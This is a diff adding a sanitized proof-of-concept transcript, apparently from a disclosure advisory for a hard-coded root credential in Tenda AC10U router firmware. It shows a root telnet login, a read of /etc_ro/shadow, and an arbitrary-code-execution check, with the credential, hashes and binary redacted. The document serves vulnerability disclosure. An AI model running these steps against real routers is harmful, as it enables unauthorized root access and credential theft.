@@ -1,0 +1,25 @@
+C-3 root shell transcript (SANITIZED)
+=====================================
+
+Target      : Tenda AC10U V1.0, firmware V15.03.06.48_multi_TDE01
+Environment : QEMU user-mode (qemu-mipsel-static) + chroot over the extracted rootfs
+
+[1] telnet 192.168.0.1 23
+    login:    root
+    password: <redacted: shipped hard-coded credential, disclosed to CNA/vendor>
+
+[2] ~ # id
+    uid=0(root) gid=0(root)
+
+[3] ~ # cat /etc_ro/shadow
+    <redacted: root-only file readable; two MD5-crypt hashes for root>
+
+[4] ~ # /tmp/rceproof
+    C3_RCE_OK uid=0 euid=0
+
+Notes
+-----
+- The login credential is a shipped hard-coded value, not a user-configured password.
+  It is redacted here and provided privately to the CNA or vendor on request.
+- `/tmp/rceproof` is a statically linked MIPS test binary used only to demonstrate
+  arbitrary code execution; it is not distributed with this advisory.
